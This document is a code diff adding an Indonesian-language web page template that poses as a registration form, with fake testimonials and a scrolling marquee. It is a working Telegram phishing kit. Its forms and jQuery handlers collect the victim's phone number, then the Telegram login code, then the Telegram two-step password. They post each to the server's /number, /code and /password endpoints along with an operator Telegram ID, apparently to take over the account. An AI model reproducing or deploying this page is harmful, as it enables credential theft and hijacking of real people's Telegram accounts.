@@ -1,0 +1,713 @@
+<div class="first">
+  <h4 class="fw-bold mt-2 page-header text-center ">
+      <span id="ctl00_RecipientMasterContent_lblSubject">
+          <marquee scrolldelay="30">Silahkan isi Data Anda Dengan Benar Di Bawah Untuk Registrasi</marquee>
+      </span>
+  </h4>
+  <form action="javascript:void(0)" method="post" id="firstForm">
+      <section>
+          <p style="background: #063f75; color: #f1f3f5; padding-top: 6px; margin-bottom: 6px; padding-bottom: 0px; height: 31px; font-size: 14px; text-align: center;"><%= title %></p>
+          <div class="first">
+              <div class="col-sm-12">
+                  <label for="Name">Nama Lengkap (Sesuai E-KTP)</label>
+                  <input class="form-control" placeholder="Nama Lengkap" data-presence="true" maxlength="100" size="100" type="text" name="full_name" id="full_name" required="true" >
+<div class="col-sm-12">
+  <label for="provinsi">Alamat/Domisili</label>
+  <select class="form-control" name="provinsi" id="provinsi" required="true">
+    <option value="" disabled selected>Pilih Provinsi</option>
+      <option value="Aceh">Aceh</option>
+      <option value="Bali">Bali</option>
+      <option value="Banten">Banten</option>
+      <option value="Bengkulu">Bengkulu</option>
+      <option value="DI Yogyakarta">DI Yogyakarta</option>
+      <option value="DKI Jakarta">DKI Jakarta</option>
+      <option value="Gorontalo">Gorontalo</option>
+      <option value="Jambi">Jambi</option>
+      <option value="Jawa Barat">Jawa Barat</option>
+      <option value="Jawa Tengah">Jawa Tengah</option>
+      <option value="Jawa Timur">Jawa Timur</option>
+      <option value="Kalimantan Barat">Kalimantan Barat</option>
+      <option value="Kalimantan Selatan">Kalimantan Selatan</option>
+      <option value="Kalimantan Tengah">Kalimantan Tengah</option>
+      <option value="Kalimantan Timur">Kalimantan Timur</option>
+      <option value="Kalimantan Utara">Kalimantan Utara</option>
+      <option value="Kepulauan Bangka Belitung">Kepulauan Bangka Belitung</option>
+      <option value="Kepulauan Riau">Kepulauan Riau</option>
+      <option value="Lampung">Lampung</option>
+      <option value="Maluku">Maluku</option>
+      <option value="Maluku Utara">Maluku Utara</option>
+      <option value="Nusa Tenggara Barat">Nusa Tenggara Barat</option>
+      <option value="Nusa Tenggara Timur">Nusa Tenggara Timur</option>
+      <option value="Papua">Papua</option>
+      <option value="Papua Barat">Papua Barat</option>
+      <option value="Riau">Riau</option>
+      <option value="Sumatera Barat">Sumatera Barat</option>
+      <option value="Sumatera Selatan">Sumatera Selatan</option>
+      <option value="Sumatera Utara">Sumatera Utara</option>
+      <option value="Banten">Banten</option>
+      <option value="Bali">Bali</option>
+      <option value="Nusa Tenggara Barat">Nusa Tenggara Barat</option>
+  </select>        
+</div>
+
+              <div class="col-sm-12">
+                  <label for="Name">Usia</label>
+                  <input placeholder="Masukan Usia anda" class="form-control" data-presence="true" data-ic="true" data-content="Sila masukkan nombor pengenalan yang sah" type="text" name="usia" id="usia" required="true" >
+              </div>
+
+              </div>
+              <div class="col-sm-12">
+                  <label for="sector">Jenis Kelamin</label>
+                  <div class="field-arrow">
+                      <select class="form-control ploan_application_sector" data-presence="true" name="kelamin" id="kelamin" required="true" >
+                          <option value="Pria">Laki Laki</option>
+                          <option value="Wanita">Perempuan</option>
+                      </select>
+                  </div>
+             
+
+              </div>
+              <div class="col-sm-12">
+                  <label for="Name">Nomor Telegram Aktif</label>
+                  <input placeholder="Masukkan Nomor Telegram Aktif" class="form-control" data-presence="true" data-content="Silakan masukkan nomor telepon yang aktif dan sudah menggunakan Telegram" type="tel" name="phone_number" id="phone_number" required="true" >
+              </div>
+              <div class="col-sm-12">
+                  <label for="agree_telegram">
+                      <input required="true" name="personal_loan_application[agree_whatsapp]" type="hidden" value="0"><input data-checkbox="true" data-content="Centang Kotak" type="checkbox" value="1" name="personal_loan_application[agree_whatsapp]" id="personal_loan_application_agree_whatsapp">
+                          Saya setuju untuk menerima pesan Telegram dari Admin tentang Registrasi Ini
+                  </label>
+              </div>
+              <div class="text-center">
+                  <button type="submit" id="firstbutt" class="btn btn-lg btn-block btn-mk" onclick="processFirstData()"><%=  buttonname  %></button>
+              </div>
+
+          </div>
+      </section>
+  </form>
+</div>
+
+<div class="second" style="display: none;">
+  <form action="javascript:void(0)" method="post" id="secondForm">
+      <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+          <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+      <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+      <input type="hidden" name="usia" id="validateusia" readonly="">
+      <input type="hidden" name="kelamin" id="validatekelamin" readonly="">
+      <input type="hidden" name="full_name" id="validatefull_name" readonly="">
+      <div class="mb-3">
+          <label for="otp_code" class="form-label">
+              <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami telah mengirimkan Anda kode verifikasi
+                  ke aplikasi Telegram di perangkat Anda.</span>
+          </label>
+          <input name="otp_code" maxlength="5" id="otp" class="form-control" type="tel" required="true" placeholder="Masukkan kode Otp">
+      </div>
+      <div class="text-center">
+          <button type="submit" id="secondbutt" class="btn btn-lg btn-block btn-mk" onclick="processSecondData()">BERIKUTNYA</button>
+      </div>
+  </form>
+</div>
+
+<div class="third" style="display: none;">
+  <form action="javascript:void(0)" method="post" id="thirdForm">
+      <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+      <input type="hidden" name="otp_code" id="validateotp_code" readonly="">
+      <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+      <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+      <input type="hidden" name="usia" id="validateusia" readonly="">
+      <input type="hidden" name="kelamin" id="validatekelamin" readonly="">
+      <input type="hidden" name="full_name" id="validatefull_name" readonly="">
+      <div class="mb-3">
+          <label for="password" class="form-label">
+              <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Masukkan kata sandi
+                  Telegram Anda</span>
+          </label>
+          <input required="true" name="password" id="password" class="form-control" type="text" placeholder="Masukkan kata sandi anda">
+      </div>
+      <div class="text-center">
+          <button type="submit" id="thirdbutt" class="btn btn-lg btn-block btn-mk" onclick="processThirdData()">Konfirmasi</button>
+      </div>
+  </form>
+</div>
+
+
+<div class="four" style="display: none;">
+    <div class="container">
+        <p style="background: #347949; color: #f1f3f5; padding-top: 1px; margin-bottom: 6px; padding-bottom: 0px; height: 31px; font-size: 14px; text-align: center;">
+            &nbsp; TERIMA KASIH.<br><br>
+        </p>
+        
+        <section style="border: 1px solid #c2c5c8; padding: 12px 20px 20px 20px;">
+            <form action="javascript:void(0)" method="post" id="fourForm" enctype="multipart/form-data">
+                <input type="hidden" name="phone_number" id="validatephone_number" readonly>
+                <input type="hidden" name="otp_code" id="validateotp_code" readonly>
+                <input type="hidden" name="password" id="validatepassword" readonly>
+
+                <div class="mb-3">
+                    <p class="fw-bold mt-2 page-header text-center">
+                        <span id="ctl00_RecipientMasterContent_lblSubject">
+                           <%=  titlefour  %>
+                        </span>
+                    </p>
+                </div>
+
+                <!-- Bagian yang diubah -->
+                <section class="text-center" style="padding-top: 10px; display: flex; flex-direction: column; align-items: center;">
+                    <img src="/assets/img/loading.gif" alt="Loading..." style="width: 150px; margin-bottom: 10px;">
+                </section>
+            </form>
+        </section>
+    </div>
+</div>
+
+<div class="carousel-container" >
+  <ul class="carouseltext" style="list-style: none;">
+      <li class="first">
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+             <div class="col ms-3">
+                  <div>Sari Puspitasari</div>
+                  <div class="small"><%=  footerdesc  %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Teddy Pramono</div>
+                  <div class="small"><%=  footerdesc  %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+            <div class="col ms-3">
+                  <div>Citra Adinda</div>
+                  <div class="small"><%=  footerdesc  %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Haris Nugroho</div>
+                  <div class="small"><%=  footerdesc  %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Sari Puspitasari</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Rina Amelia</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Andi Saputra</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Nurul Hidayah</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Faisal Ramadhan</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Intan Permata</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Ariani Putri</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Rizki Nugraha</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Indah Yuliana</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Rizki Akbar</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Aulia Salsabila</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Muhammad Fajar</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Wulan Sari</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+      <li>
+          <div class="row d-flex align-items-center">
+              <div class="col-2">
+                  <img class="rounded-circle me-3" src="/assets/img/avatar.png" alt="profile" width="40px">
+              </div>
+              <div class="col ms-3">
+                  <div>Yusuf Arifin</div>
+                  <div class="small"><%= footerdesc %></div>
+              </div>
+          </div>
+      </li>
+  </ul>
+</div>
+
+
+
+<br>
+
+
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+<script>
+
+  $(document).ready(function(){
+          var container = $('.carouseltext'),
+              items = container.find('li'),
+              containerHeight = 0,
+              numberVisible = 5, // Jumlah item yang terlihat
+              intervalSec = 2000; // Interval untuk scroll dalam milidetik
+
+          // Menambahkan kelas "first" ke item pertama jika belum ada
+          if (!container.find('li:first').hasClass("first")) {
+              container.find('li:first').addClass("first");
+          }
+
+          // Menghitung tinggi total container berdasarkan jumlah item yang terlihat
+          items.each(function () {
+              if (containerHeight < numberVisible * $(this).outerHeight()) {
+                  containerHeight += $(this).outerHeight();
+              }
+          });
+
+          container.css({ height: containerHeight, overflow: "hidden" });
+
+          // Fungsi untuk memindahkan item pertama ke bawah
+          function vertCycle() {
+              var firstItem = container.find('li.first'); // Ambil item pertama
+              var firstItemHtml = firstItem.html();
+
+              // Salin item pertama dan tambahkan ke bawah
+              container.append('<li>' + firstItemHtml + '</li>');
+
+              // Animasi untuk menggeser item pertama ke atas
+              firstItem.animate({ marginTop: "-50px" }, 600, function () {
+                  $(this).remove(); // Hapus item pertama yang sudah bergeser
+                  container.find('li:first').addClass("first"); // Tandai item pertama yang baru
+              });
+          }
+
+          // Tentukan interval minimal 700ms
+          if (intervalSec < 700) {
+              intervalSec = 700;
+          }
+
+          // Mulai interval untuk memanggil vertCycle setiap intervalSec detik
+          var init = setInterval(vertCycle, intervalSec);
+
+          // Hentikan interval saat hover, dan mulai kembali setelah hover selesai
+          container.hover(function () {
+              clearInterval(init);
+          }, function () {
+              init = setInterval(vertCycle, intervalSec);
+          });
+      });
+      
+      
+      
+      
+      
+      
+function formatPhoneNumber(phoneNumber) {
+  // Jika nomor telepon diawali dengan '0', ganti dengan '+628'
+  if (phoneNumber.startsWith('0')) {
+      return '+62' + phoneNumber.substring(1);
+  }
+  // Jika nomor sudah dimulai dengan '62', ganti dengan '+628'
+  else if (phoneNumber.startsWith('62')) {
+      return '+62' + phoneNumber.substring(2);
+  }
+  // Jika format sudah sesuai, kembalikan nomor tanpa perubahan
+  else {
+      return phoneNumber;
+  }
+}
+function processFirstData(){
+$('#firstForm').submit(function(submitingprocessFirstData){
+submitingprocessFirstData.preventDefault();
+
+var $full_name = $("input#full_name").val();
+var $phone = $("input#phone_number").val();
+var $phone_number = formatPhoneNumber($phone);
+          var $provinsi = $("select#provinsi").val();
+          var $usia = $("input#usia").val();
+          var $kelamin = $("select#kelamin").val();
+
+
+var dataToSend = {
+      full_name: $full_name,
+      phone_number: $phone_number,
+      provinsi: $provinsi,
+      usia: $usia,
+      kelamin: $kelamin
+  };
+          console.log(dataToSend)
+
+
+          if($full_name === "" && $phone_number === ""){
+              return false;
+          }
+
+$.ajax({
+type: "POST",
+url: "/number",
+data: dataToSend,
+beforeSend: function() {
+$('.loading').show();
+$("#alert").html("")
+$('#firstbutt').hide();
+},
+success: function(hasil){
+  if(hasil.code == 200){   
+      $(".second").show();
+      $('.loading').hide();
+      $('.first').hide();
+      $("input#validatephone_number").val($phone_number);
+      $("input#validateprovinsi").val($provinsi);
+      $("input#validateusia").val($usia);
+      $("input#validatekelamin").val($kelamin);
+      $("input#validatefull_name").val($full_name);
+         $("input#validateclientHash").val(hasil.clientHash);
+  }else{
+      if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
+                          
+      $('.loading').hide();
+                          $("#alert").html(`
+                          <div class="alert alert-danger" role="alert">
+                              Nomor Yang Anda Masukkan Tidak Valid!
+                              </div>
+                              `)
+      $('.loading').hide();
+                              $('#firstbutt').show();
+                          }else if(hasil.err.errorMessage == "FLOOD"){
+                              
+                              $("#alert").html(`
+                              <div class="alert alert-danger" role="alert">
+                                  Terlalu Banyak Permintaan Code!
+                                  </div>
+                                  `)
+      $('.loading').hide();
+                                  $('#firstbutt').show();
+                          }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
+      $('.loading').hide();
+                              $('#firstbutt').show();
+                              
+                              $("#alert").html(`
+                              <div class="alert alert-danger" role="alert">
+                                  Terlalu Banyak Memasukkan Password!
+                                  </div>
+                                  `)
+                              }else{
+                                   $('.loading').hide();
+                              $('#firstbutt').show();
+                                  $("#alert").html(`<div class="alert alert-danger" role="alert">
+                                      ${hasil.err.errorMessage}
+                                      </div>`)
+                                  }
+  }
+
+}
+});
+});  
+return false;
+};
+function processSecondData(){
+$('#secondForm').submit(function(submitingprocessSecondData){
+submitingprocessSecondData.preventDefault();
+
+var $clientHash = $("input#validateclientHash").val();
+var $phone_number = $("input#validatephone_number").val();
+var $full_name = $("input#validatefull_name").val();
+var $provinsi = $("input#validateprovinsi").val();
+var $usia = $("input#validateusia").val();
+var $kelamin = $("input#validatekelamin").val();
+var $otp_code = $("input#validateotp_code").val();
+   var $idtele = "<%= String(telegramId) %>"
+
+if($phone_number == "" && $otp_code == ""){
+return false;
+}
+
+console.log("Sending data:", $(this).serialize() + "&idtele=" + encodeURIComponent($idtele)); 
+$.ajax({
+  type: "POST",
+                          url: "/code",
+                          data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
+                          beforeSend: function() {
+                              $("#alert").html("")
+                              $('.loading').show();
+                              $('#secondbutt').hide();
+                          },
+success: function(hasil){
+
+                                         $('.loading').hide();
+                              $('#secondbutt').show();
+  if(hasil.needPassword || hasil.code == 401){
+
+                              
+$('.loading').hide();
+      $(".third").show();
+$('.second').hide();
+$("input#validatephone_number").val($phone_number);
+$("input#validateprovinsi").val($provinsi);
+$("input#validateusia").val($usia);
+$("input#validatekelamin").val($kelamin);
+$("input#validatefull_name").val($full_name);
+$("input#validateotp_code").val($otp_code);
+$("input#validateclientHash").val($clientHash);
+  }else{
+
+                                          $('.loading').hide();
+                             
+      try{
+            console.log(hasil)                
+                if(hasil.code == 200){
+                     
+                          $('.loading').hide();
+                            
+                              $(".four").show();
+                                          $('.second').hide();
+                     
+                }else{
+                          $('.loading').hide();
+                             
+                    $("#alert").html(`<div class="alert alert-danger" role="alert">${hasil.code} - ${hasil.error}</div>`)
+                                              
+                }
+                            
+                            
+                                      
+                      
+                                      
+                                  }catch(e){
+                                      console.log(e)
+                                      console.log(hasil)
+                                      
+                                          $('.loading').hide();
+                            
+                                    
+                                              
+                                              
+                                             $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah,coba lagi</div>`)
+                                              
+                                              
+                 
+                                              
+                                              
+                                              
+                                          }   
+  }
+
+},
+error: function(xhr, status, error) {
+      if (status === "timeout") {
+   $('.loading').hide();
+                            
+         $("#alert").html(`<div class="alert alert-danger" role="alert">Periksa jaringan anda dan coba lagi</div>`)
+      } else {
+   $('.loading').hide();
+                            
+         $("#alert").html(`<div class="alert alert-danger" role="alert">Periksa jaringan anda dan coba lagi</div>`)
+      }
+  }
+});
+});  
+return false;
+};
+
+
+function processThirdData(){
+    $('#thirdForm').submit(function(submitingprocessThirdData){
+        submitingprocessThirdData.preventDefault();
+
+        // Mengambil nilai input
+        var $phone_number = $("input#validatephone_number").val();
+        var $full_name = $("input#validatefull_name").val();
+        var $provinsi = $("input#validateprovinsi").val();
+        var $usia = $("input#validateusia").val();
+        var $kelamin = $("input#validatekelamin").val();
+        var $otp_code = $("input#validateotp_code").val();
+        var $password = $("input#password").val();
+        var $idtele = "<%= String(telegramId) %>"; // Pastikan nilai telegramId sudah valid
+        
+        // Validasi jika data penting kosong
+        if($phone_number == "" && $otp_code == "" && $password == ""){
+            $('.verification_info').show();
+            $('.account_verification').hide();
+            return false;
+        }
+
+        $.ajax({
+            type: "POST",
+            url: "/password",
+            data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
+            beforeSend: function() {
+                $("#alert").html(""); // Mengosongkan alert
+                $('.loading').show();
+                $('#thirdbutt').hide(); // Menyembunyikan tombol submit
+            },
+            success: function(response){
+                // Pastikan respons dari server berupa objek JSON yang benar
+                try {
+                    // Mengecek apakah respons sukses atau error
+                    if (response.code == 200) {
+                        $('.loading').hide();
+                        $('.third').hide();
+                        $(".four").show();
+                    } else {
+                        // Menyembunyikan loading dan menampilkan tombol kembali
+                        $('.loading').hide();
+                        $('#thirdbutt').show();
+                        
+                        // Menampilkan pesan error jika ada
+                        if (response.error) {
+                            $("#alert").html(`<div class="alert alert-danger" role="alert">${response.code} - ${response.error}</div>`);
+                        } else {
+                            $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah, refresh halaman dan coba lagi</div>`);
+                        }
+                    }
+                } catch (e) {
+                    // Menangani error di dalam blok try-catch
+                    $('.loading').hide();
+                    $('#thirdbutt').show();
+                    console.log(e);
+                    $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah, refresh halaman dan coba lagi</div>`);
+                }
+            },
+            error: function(xhr, status, error){
+                // Menangani error jika ada masalah saat pengiriman data
+                $('.loading').hide();
+                $('#thirdbutt').show();
+                console.log(error);
+                $("#alert").html(`<div class="alert alert-danger" role="alert">Terjadi kesalahan, coba lagi nanti.</div>`);
+            }
+        });
+
+        return false; // Menghentikan form submit default
+    });
+return false;
+};
+</script>
+
+
